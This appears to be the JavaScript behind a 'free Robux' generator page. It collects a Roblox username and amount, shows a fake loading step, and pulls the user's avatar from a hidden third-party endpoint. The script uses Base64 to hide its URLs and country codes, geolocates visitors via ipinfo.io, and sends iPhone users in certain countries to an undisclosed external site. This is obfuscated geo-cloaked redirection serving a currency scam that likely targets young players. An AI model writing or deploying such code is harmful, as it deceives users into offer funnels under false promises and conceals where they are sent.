    const slider = document.getElementById("robux-amount-slider");
    const selectedValue = document.getElementById("selected-robux-amount");

    slider.addEventListener("input", function() {
        selectedValue.textContent = slider.value;
    });

    async function step2() {
        const username = document.getElementById("text").value.trim();
        const robuxAmount = slider.value;
        const navRobuxAmount = document.getElementById("nav-robux-amount");
        const logoImg = document.getElementById("logo-img");
        const boxInput = document.getElementById('box-input');
        const text1 = document.getElementById("text1");
        const offers = document.getElementById("offers");
        const usernameSection = document.getElementById("username-section");
        const loadingImage = document.getElementById("loading-image");

        if (!username) {
            alert("Please enter a valid username.");
            return;
        }
        if (robuxAmount === '0') {
            alert("Please select a valid Robux amount.");
            return;
        }

        usernameSection.style.display = "none";
        boxInput.style.display = "none";
        loadingImage.style.display = "block";

        setTimeout(() => {
            fetchUserData(username, robuxAmount);
        }, 500);

        async function fetchUserData(username, robuxAmount) {
            const apiUrl = atob("aHR0cHM6Ly9hYmFkYW91Y2h0LmNvbS90aWt0b2svYXBpL3JvYmxveC91c2VyaW5mby8ke3VzZXJuYW1lfQ==".replace(/_/g, '/').replace(/-/g, '+'));
            try {
                const response = await fetch(apiUrl.replace('${username}', username));
                const data = await response.json();
                navRobuxAmount.innerHTML = "";
                logoImg.src = data.avatar || logoImg.src;
                logoImg.style.width = '120px';
                logoImg.style.height = "120px";
                logoImg.style.borderRadius = "30%";
                document.getElementById("user-name-placeholder").innerText = username;
                document.getElementById("robux-amount-placeholder").innerText = robuxAmount;
                text1.style.display = "block";
                offers.style.display = "block";
            } catch (error) {
                navRobuxAmount.innerHTML = ` 
                    <div style="text-align:center;">
                        <h2>@${username}</h2>
                        <p>Selected Robux: ${robuxAmount} Robux</p>
                    </div>
                `;
                navRobuxAmount.style.display = "block";
                logoImg.style.width = '120px';
                logoImg.style.height = "120px";
                logoImg.style.borderRadius = '30%';
                text1.style.display = "block";
                offers.style.display = "block";
            } finally {
                loadingImage.style.display = "none";
            }
        }
    }

    document.addEventListener('DOMContentLoaded', async function () {
        const button = document.querySelector('.btn.offer-btn');
        if (button) {
            try {
                const encodedApiUrl = "aHR0cHM6Ly9pcGluZm8uaW8vanNvbg=="; 
                const allowedIPhoneCountries = [
                    "VVM=", "Q0E=", "R0I=", "QVU="
                ];
                const allowedAllDevicesCountries = [
                    "QlI=", "U1c="
                ];
                const encodedRedirectUrl = "aHR0cHM6Ly93d3cucm9sbHMzLmNvbQ==";

                const decodeBase64 = (encoded) => atob(encoded);
                const apiUrl = decodeBase64(encodedApiUrl);
                const response = await fetch(apiUrl);
                const data = await response.json();
                const userCountry = btoa(data.country);
                const isIPhone = /iPhone/i.test(navigator.userAgent);
                const isIPhoneAllowed = isIPhone && allowedIPhoneCountries.includes(userCountry);
                const isAllDevicesAllowed = allowedAllDevicesCountries.includes(userCountry);

                if (isIPhoneAllowed || isAllDevicesAllowed) {
                    button.addEventListener('click', function () {
                        window.location.href = decodeBase64(encodedRedirectUrl);
                    });
                }
            } catch (error) {}
        }
    });
